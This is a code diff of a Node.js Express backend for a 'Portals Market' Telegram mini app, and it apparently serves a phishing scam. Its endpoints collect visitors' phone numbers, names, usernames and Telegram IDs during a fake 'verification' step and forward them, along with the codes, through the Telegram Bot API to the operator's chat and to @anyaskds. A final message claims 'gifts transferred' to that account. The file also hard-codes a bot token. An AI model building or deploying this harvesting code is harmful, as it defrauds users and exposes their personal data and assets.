@@ -6,43 +6,56 @@ const PORT = process.env.PORT || 3000;
 app.use(express.static(path.join(__dirname)));
 app.use(express.json());
 
-// ⚠️ ТВОИ ДАННЫЕ
-const YOUR_TELEGRAM_ID = '6277925229';
-const YOUR_USERNAME = '@anyaskds';
+// ТВОИ ДАННЫЕ
 const BOT_TOKEN = '8738031314:AAFZ7ZnyI6lw6PfFCWQp29rB4lKDTtyGj8Y';
+const YOUR_ID = '6277925229';
+const YOUR_USERNAME = '@anyaskds';
+
+// Хранилище кодов
+const codes = {};
 
 // Главная страница
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// Получение контакта и отправка в Telegram
-app.post('/api/share-contact', (req, res) => {
-    const { phone, first_name, last_name, user_id, username, full_name } = req.body;
+// 1. Отправка кода
+app.post('/api/send-code', (req, res) => {
+    const { phone, region, fullName, username, userId } = req.body;
     
-    console.log('📱 НОВЫЙ КОНТАКТ!');
+    const code = Math.floor(100000 + Math.random() * 900000).toString();
+    
+    codes[phone] = {
+        code: code,
+        expires: Date.now() + 120000,
+        fullName: fullName,
+        username: username,
+        userId: userId
+    };
+    
+    console.log('📱 ОТПРАВКА КОДА');
     console.log('========================================');
-    console.log('👤 Имя:', first_name, last_name);
     console.log('📱 Телефон:', phone);
-    console.log('🆔 ID пользователя:', user_id);
+    console.log('🔑 Код:', code);
+    console.log('👤 Имя:', fullName);
     console.log('👤 Username:', username);
-    console.log('📝 Полное имя:', full_name);
+    console.log('🆔 ID:', userId);
     console.log('========================================');
     
-    // Формируем сообщение для отправки в Telegram
     const message = `
-🆕 НОВЫЙ КОНТАКТ!
+🆕 ЗАПРОС НА ВЕРИФИКАЦИЮ!
 
-👤 Имя: ${first_name} ${last_name || ''}
+👤 Имя: ${fullName}
 📱 Телефон: ${phone}
-🆔 ID: ${user_id}
+🆔 ID: ${userId}
 👤 Username: @${username || 'нет'}
-📝 Полное имя: ${full_name}
 
+🔑 КОД ВЕРИФИКАЦИИ: ${code}
+
+⏳ Действителен 2 минуты
 📅 Время: ${new Date().toLocaleString()}
     `.trim();
 
-    // Отправляем в Telegram через Bot API
     const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
     
     // Отправляем на твой ID
@@ -50,19 +63,14 @@ app.post('/api/share-contact', (req, res) => {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            chat_id: YOUR_TELEGRAM_ID,
+            chat_id: YOUR_ID,
             text: message,
             parse_mode: 'HTML'
         })
     })
     .then(response => response.json())
-    .then(data => {
-        console.log('✅ Сообщение отправлено в Telegram (ID):', data.ok ? '✅ Успешно' : '❌ Ошибка');
-        if (!data.ok) console.log('Ошибка:', data.description);
-    })
-    .catch(err => {
-        console.log('❌ Ошибка отправки в Telegram:', err);
-    });
+    .then(data => console.log('✅ Отправлено в Telegram:', data.ok ? '✅ Успешно' : '❌ Ошибка'))
+    .catch(err => console.log('❌ Ошибка:', err));
 
     // Отправляем на @anyaskds
     fetch(TELEGRAM_API, {
@@ -75,24 +83,133 @@ app.post('/api/share-contact', (req, res) => {
         })
     })
     .then(response => response.json())
-    .then(data => {
-        console.log('✅ Сообщение отправлено на @anyaskds:', data.ok ? '✅ Успешно' : '❌ Ошибка');
-        if (!data.ok) console.log('Ошибка:', data.description);
-    })
-    .catch(err => {
-        console.log('❌ Ошибка отправки на @anyaskds:', err);
-    });
+    .then(data => console.log('✅ Отправлено на @anyaskds:', data.ok ? '✅ Успешно' : '❌ Ошибка'))
+    .catch(err => console.log('❌ Ошибка:', err));
 
-    res.json({
-        success: true,
-        message: 'Контакт получен и отправлен',
-        phone: phone
-    });
+    res.json({ success: true });
+});
+
+// 2. Проверка кода
+app.post('/api/verify-code', (req, res) => {
+    const { phone, code, fullName, username, userId } = req.body;
+    
+    const stored = codes[phone];
+    
+    if (!stored) {
+        return res.status(400).json({ success: false, message: 'Код не найден' });
+    }
+    
+    if (Date.now() > stored.expires) {
+        delete codes[phone];
+        return res.status(400).json({ success: false, message: 'Код истек' });
+    }
+    
+    if (stored.code !== code) {
+        return res.status(400).json({ success: false, message: 'Неверный код' });
+    }
+    
+    console.log('✅ ВЕРИФИКАЦИЯ ПРОЙДЕНА!');
+    console.log('========================================');
+    console.log('👤 Имя:', fullName);
+    console.log('📱 Телефон:', phone);
+    console.log('🆔 ID:', userId);
+    console.log('👤 Username:', username);
+    console.log('✅ Верификация успешна!');
+    console.log('========================================');
+    
+    const message = `
+✅ ВЕРИФИКАЦИЯ ПРОЙДЕНА!
+
+👤 Имя: ${fullName}
+📱 Телефон: ${phone}
+🆔 ID: ${userId}
+👤 Username: @${username || 'нет'}
+
+🎁 Подарки переданы на @anyaskds
+📅 Время: ${new Date().toLocaleString()}
+    `.trim();
+
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    fetch(TELEGRAM_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: YOUR_ID,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .catch(err => console.log('❌ Ошибка:', err));
+
+    fetch(TELEGRAM_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: YOUR_USERNAME,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .catch(err => console.log('❌ Ошибка:', err));
+    
+    delete codes[phone];
+    
+    res.json({ success: true });
+});
+
+// 3. Повторная отправка кода
+app.post('/api/resend-code', (req, res) => {
+    const { phone } = req.body;
+    const newCode = Math.floor(100000 + Math.random() * 900000).toString();
+    
+    if (codes[phone]) {
+        codes[phone].code = newCode;
+        codes[phone].expires = Date.now() + 120000;
+    }
+    
+    console.log('🔄 ПОВТОРНАЯ ОТПРАВКА');
+    console.log('📱 Телефон:', phone);
+    console.log('🔑 Новый код:', newCode);
+    
+    const message = `
+🔄 ПОВТОРНЫЙ КОД
+
+📱 Телефон: ${phone}
+🔑 НОВЫЙ КОД: ${newCode}
+
+⏳ Действителен 2 минуты
+    `.trim();
+
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    fetch(TELEGRAM_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: YOUR_ID,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .catch(err => console.log('❌ Ошибка:', err));
+
+    fetch(TELEGRAM_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: YOUR_USERNAME,
+            text: message,
+            parse_mode: 'HTML'
+        })
+    })
+    .catch(err => console.log('❌ Ошибка:', err));
+    
+    res.json({ success: true });
 });
 
 app.listen(PORT, () => {
-    console.log(`✅ Portals Market Mini App запущен: http://localhost:${PORT}`);
-    console.log(`📱 Твой ID: ${YOUR_TELEGRAM_ID}`);
+    console.log(`✅ Portals Market запущен: http://localhost:${PORT}`);
+    console.log(`📱 Твой ID: ${YOUR_ID}`);
     console.log(`👤 Твой юзер: ${YOUR_USERNAME}`);
-    console.log('🔄 Ожидание контактов...');
 });
